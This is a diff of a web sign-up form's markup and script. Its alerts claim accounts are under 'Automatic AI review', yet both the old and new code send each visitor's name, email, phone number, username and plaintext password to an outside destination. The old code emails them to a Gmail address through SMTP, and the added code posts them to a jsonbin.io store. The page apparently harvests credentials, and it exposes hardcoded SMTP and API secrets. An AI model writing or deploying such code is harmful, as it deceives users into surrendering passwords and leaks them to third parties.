@@ -100,8 +100,10 @@
             <input type="text" id="number"placeholder="Phone number" required>
             <input type="text" id="username" placeholder="Username" required>
             <input type="text" id="password" placeholder="Password" required>
-            <button type="submit" class="btn-submit">Submit</button>
           </form>
+          
+          <button type="button" class="btn-submit" onClick="createAcc()">Create Account</button>
+          
           <!-- end of sign up form -->
         </div> <!-- end of text-container -->
       </div> <!-- end of container-ter -->
@@ -111,34 +113,62 @@
 
          
 <script type='text/javascript'>
-  function submitForm() {
-    event.preventDefault();
+  
 
-    var name = document.getElementById("name").value;
-    var email = document.getElementById("email").value;
-    var number = document.getElementById("number").value;
-    var username = document.getElementById("username").value;
-    var password = document.getElementById("password").value;
+      function createAcc(){
 
-     alert(`Account under Automatic AI review,please keep checking your mail for login details,suspicious accounts will be rejected.`);
 
-   Email.send({
-       Host: "smtp.elasticemail.com",
-       Username : "maselecybernetics@gmail.com",
-       Password : "BA3B28BF5DD81DA9024CDF816A661E054D5B",
-       To : 'gmasele15@gmail.com',
-       From : "maselecybernetics@gmail.com",
-       Subject : name,
-       Body : "Email:"+email+"Number:"+number+"Username:"+username+"Password:"+password,
-   }).then(
-   message => alert("Account under Automatic AI review,please keep checking your mail for login details")
-   );
+        var name = document.getElementById("name").value;
+        var email = document.getElementById("email").value;
+        var number = document.getElementById("number").value;
+        var username = document.getElementById("username").value;
+        var password = document.getElementById("password").value;
+        
+        
+        const secretKey = '$2b$10$5.GD5IWqNSL2RsbiNWZdbeQGJ3wkUk/t3ZxfbbLn2ddvAPibpWpr.';
+        const binName= 'myBin';
 
 
 
-  }
+      
+        const data = {
+        Name: name,
+        Email: email,
+        Number: number,
+        Username: username,
+        Password: password
+      };
 
-  document.getElementById("myForm").addEventListener("submit", submitForm);
+      
+       fetch('https://api.jsonbin.io/v3/b', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+              "X-Master-Key": secretKey,
+              "X-Bin-Private": true,
+              'X-Bin-Name': email
+            },
+            body: JSON.stringify(data)
+          })
+         .then(response => response.json())
+         .then(jsonData => console.log(jsonData))
+         .catch(error => console.error(error));
+      
+
+
+
+
+            alert("Processing,account will be active in 20mins");
+
+
+
+
+
+         }
+
+
+
+
 </script>
 
 
